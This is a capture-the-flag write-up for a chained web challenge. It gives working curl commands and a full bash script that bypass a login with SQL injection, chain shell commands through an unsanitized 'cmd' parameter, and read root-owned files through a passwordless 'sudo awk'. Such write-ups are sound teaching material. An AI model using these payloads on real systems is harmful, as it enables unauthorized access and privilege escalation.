# No Cap Just Root — 1

- **Category:** Pwn / Web (chained)
- **Target:** `http://chal-8959fcf9.ctf.thcon.party`

```
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

## TL;DR

- A three-step chain: **SQLi** to bypass `/login.php`, **command injection** in `/admin.php?cmd=`, then **passwordless `sudo awk`** for privilege escalation to read `flag.txt`.
- Login uses a string-concatenated query — `user=' or 1=1 -- -` lands in the admin session.
- `cmd` parameter is shelled out unsanitized; `;` cleanly separates the benign ping target from the next command.
- `sudo -l` exposes `awk` as a NOPASSWD entry. `awk 1 <file>` is the GTFOBin one-liner — `awk` reads any file as root.

## 1. SQLi at `/login.php`

```bash
$ curl -ksS -i -c jar.txt -X POST \
    --data-urlencode "user=' or 1=1 -- -" \
    --data-urlencode "pass=anything" \
    http://chal-8959fcf9.ctf.thcon.party/login.php
HTTP/1.1 302 Found
Location: admin.php
Set-Cookie: PHPSESSID=...
```

Classic single-quote SQL break + tautology + `-- -` comment. The redirect to `admin.php` is the success oracle.

## 2. Command injection at `/admin.php?cmd=`

The admin panel offers a "ping" feature: it shells out the `cmd` query parameter. No quoting, no escaping, no allow-list:

```bash
$ curl -ksS -b jar.txt 'http://chal-8959fcf9.ctf.thcon.party/admin.php?cmd=127.0.0.1'
PING 127.0.0.1 (127.0.0.1) ...
```

`;` chains a second command:

```bash
$ curl -ksS -b jar.txt --get \
    --data-urlencode "cmd=127.0.0.1;id" \
    http://chal-8959fcf9.ctf.thcon.party/admin.php
PING 127.0.0.1 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have shell as `www-data`.

## 3. Privesc via `sudo awk`

```bash
$ curl -ksS -b jar.txt --get \
    --data-urlencode "cmd=127.0.0.1;sudo -l" \
    http://chal-8959fcf9.ctf.thcon.party/admin.php
...
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/awk
```

`awk` is a [GTFOBin](https://gtfobins.github.io/gtfobins/awk/): `awk 1 <file>` runs the trivial program `1` (always-true rule, default action is print) over `<file>` and emits its contents. With `sudo` it reads any file as root.

```bash
$ curl -ksS -b jar.txt --get \
    --data-urlencode "cmd=127.0.0.1;sudo awk 1 /var/www/html/flag.txt" \
    http://chal-8959fcf9.ctf.thcon.party/admin.php
PING 127.0.0.1 ...
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

## 4. End-to-end

```bash
#!/usr/bin/env bash
set -euo pipefail
T="http://chal-8959fcf9.ctf.thcon.party"
J=$(mktemp); trap "rm -f $J" EXIT

curl -s -c "$J" -X POST "$T/login.php" \
  --data-urlencode "user=' or 1=1 -- -" \
  --data-urlencode "pass=x" >/dev/null

curl -s -b "$J" --get "$T/admin.php" \
  --data-urlencode "cmd=127.0.0.1;sudo awk 1 /var/www/html/flag.txt" \
  | grep -oP 'THC\{[^}]+\}'
```

```
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

## 5. Methodology

- **`' or 1=1 -- -` is the first thing to try on any login form.** Free, fast, and rules in/out string-concat SQLi in seconds.
- **Read `sudo -l` before reaching for kernel exploits.** A NOPASSWD entry on a GTFOBin (awk, find, vim, less, tar, ...) collapses privesc to a one-liner.
- **`awk 1 <file>` is the universal "cat" for awk-as-root.** Easier to type than the equivalent `awk 'BEGIN { while (...) }'` constructs and uses no shell features the sudoers entry could plausibly block.
- **The flag tells the story:** `sqli_and_awk_sudo_is_pure_brainrot` — the author is signaling both halves of the chain. When the flag mentions a tool, that tool was the privesc.
